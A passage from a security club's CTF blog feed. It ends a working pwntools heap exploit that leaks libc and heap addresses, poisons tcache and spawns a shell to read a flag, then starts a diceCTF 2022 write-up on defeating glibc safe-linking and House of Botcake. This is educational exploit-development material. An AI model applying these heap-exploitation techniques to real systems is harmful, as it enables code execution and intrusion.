io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Y&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 Add&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c7cc0&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;))

show(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decrypt_pointer(pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 Add&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(heap)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

environ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbe02f0&lt;/span&gt;

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x411&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(((heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2730&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x404010&lt;/span&gt;)))

&lt;span style=&#34;color:#75715e&#34;&gt;# dumb&lt;/span&gt;
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;#===&lt;/span&gt;

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5 re-age user&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter size (1032 minimum): &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbbdf80&lt;/span&gt;))
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system))
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71ab0&lt;/span&gt;))
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input bio: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4cb40&lt;/span&gt;))

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat flag.txt&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;- https://clubsecu-esiea.github.io/posts/cshell2/ - Beerware shit</description>
        </item>
    
    
    
        <item>
        <title>[diceCTF 2022 - pwn] catastrophe</title>
        <link>https://clubsecu-esiea.github.io/posts/catastrophe/</link>
        <pubDate>Thu, 28 Jul 2022 00:00:00 +0000</pubDate>
        
        <guid>https://clubsecu-esiea.github.io/posts/catastrophe/</guid>
        <description>ESIEA security club https://clubsecu-esiea.github.io/posts/catastrophe/ -&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I just learned how to use malloc and free&amp;hellip; am I doing this right?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in &lt;code&gt;/lib/libc.so.6&lt;/code&gt;, then I figured out thanks to my teammate &lt;a href=&#34;../../tags/supersnail&#34;&gt;supersnail&lt;/a&gt; that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&amp;rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had &lt;code&gt;FULL RELRO&lt;/code&gt; while  it had only &lt;code&gt;PARTIAL RELRO&lt;/code&gt;. Find the exploit and the tasks &lt;a href=&#34;https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe&#34;&gt;right here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;tl-dr&#34;&gt;TL; DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Leak heap address + defeating safe linking by printing the first free&amp;rsquo;d chunk in the tcache.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c&#34;&gt;House of botcake&lt;/a&gt; to create overlapping chunks and get arbitrary write&lt;/li&gt;
&lt;li&gt;FSOP on stdout to leak &lt;code&gt;environ&lt;/code&gt; and then ROP over the stack.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;what-we-have&#34;&gt;What we have&lt;/h2&gt;
&lt;p&gt;catastrophe is a classic heap challenge here are the classic informations about it:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&amp;lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.
$ checksec --file libc.so.6 
[*] &#39;/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ checksec --file catastrophe 
[*] &#39;/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;2.35&lt;/code&gt; libc, which means there is no more classic hooks like &lt;code&gt;__malloc_hook&lt;/code&gt; or &lt;code&gt;__free_hook&lt;/code&gt;. The binary allows to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;malloc up to 0x200 bytes and read data in it with the use of &lt;code&gt;fgets&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Allocate from the index 0 to 9&lt;/li&gt;
&lt;li&gt;free anything given the index is between 0 and 9&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Thus we can easily do a &lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c&#34;&gt;House of botcake&lt;/a&gt; but first of all we have to defeat the safe linking to properly getting an arbitrary write.&lt;/p&gt;
&lt;h2 id=&#34;defeat-safe-linking&#34;&gt;Defeat safe-linking&lt;/h2&gt;
&lt;p&gt;Since &lt;code&gt;2.32&lt;/code&gt; is introduced in the libc the safe-linking mechanism that does some xor encyptions on &lt;code&gt;tcache&lt;/code&gt;, &lt;code&gt;fastbin&lt;/code&gt; next fp to prevent pointer hiijacking. Here is the core of the mechanism:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Safe-Linking:
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   Use randomness from ASLR (mmap_base) to protect single-linked lists
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   of Fast-Bins and TCache.  That is, mask the &amp;#34;next&amp;#34; pointers of the
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   lists&amp;#39; chunks, and also perform allocation alignment checks on them.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   This mechanism reduces the risk of pointer hijacking, as was done with
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   Safe-Unlinking in the double-linked lists of Small-Bins.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   larger pages provide less entropy, although the pointer mangling
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   still works.  */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define PROTECT_PTR(pos, ptr) \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  ((__typeof (ptr)) ((((size_t) pos) &amp;gt;&amp;gt; 12) ^ ((size_t) ptr)))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;amp;ptr, ptr)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since for this challenge we&amp;rsquo;re focused on &lt;code&gt;tcache&lt;/code&gt;, here is how a chunk is free&amp;rsquo;d using safe-linking:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Caller must ensure that we know tc_idx is valid and there&amp;#39;s room
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   for more chunks.  */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; __always_inline &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;tcache_put&lt;/span&gt; (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (tcache_entry &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) chunk2mem (chunk);

  &lt;span style=&#34;color:#75715e&#34;&gt;/* Mark this chunk as &amp;#34;in the tcache&amp;#34; so the test in _int_free will
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     detect a double free.  */&lt;/span&gt;
  e&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tcache_key;

  e&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PROTECT_PTR (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next, tcache&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries[tc_idx]);
  tcache&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries[tc_idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; e;
  &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;(tcache&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;counts[tc_idx]);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thus, the first time a chunk is inserted into a tcache list, &lt;code&gt;e-&amp;gt;next&lt;/code&gt; is initialized to &lt;code&gt;&amp;amp;e-&amp;gt;next &amp;gt;&amp;gt; 12&lt;/code&gt; (heap base address) xor &lt;code&gt;tcache-&amp;gt;entries[tc_idx]&lt;/code&gt; which is equal to zero when the list for a given size is empty.&lt;/p&gt;
&lt;p&gt;Which means to leak the heap address we simply have to print a free&amp;rsquo;d chunk once it has been inserted in the tcache.&lt;/p&gt;
&lt;h2 id=&#34;house-of-botcake&#34;&gt;House of botcake&lt;/h2&gt;
&lt;p&gt;The &lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c&#34;&gt;House of botcake&lt;/a&gt; gives a write what where primitive by poisoning the tcache. The algorithm is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allocate 7 &lt;code&gt;0x100&lt;/code&gt; sized chunks to then fill the tcache (7 entries).&lt;/li&gt;
&lt;li&gt;Allocate two more &lt;code&gt;0x100&lt;/code&gt; sized chunks (&lt;code&gt;prev&lt;/code&gt; and &lt;code&gt;a&lt;/code&gt; in the example).&lt;/li&gt;
&lt;li&gt;Allocate a small &amp;ldquo;barrier&amp;rdquo; &lt;code&gt;0x10&lt;/code&gt; sized chunk.&lt;/li&gt;
&lt;li&gt;Fill the tcache by freeing the first 7 chunks.&lt;/li&gt;
&lt;li&gt;free(a), thus &lt;code&gt;a&lt;/code&gt; falls into the unsortedbin.&lt;/li&gt;
&lt;li&gt;free(prev), thus &lt;code&gt;prev&lt;/code&gt; is consolidated with &lt;code&gt;a&lt;/code&gt; to create a large &lt;code&gt;0x221&lt;/code&gt; sized chunk that is yet in the unsortedbin.&lt;/li&gt;
&lt;li&gt;Request one more &lt;code&gt;0x100&lt;/code&gt; sized chunk to let a single entry left in the tcache.&lt;/li&gt;
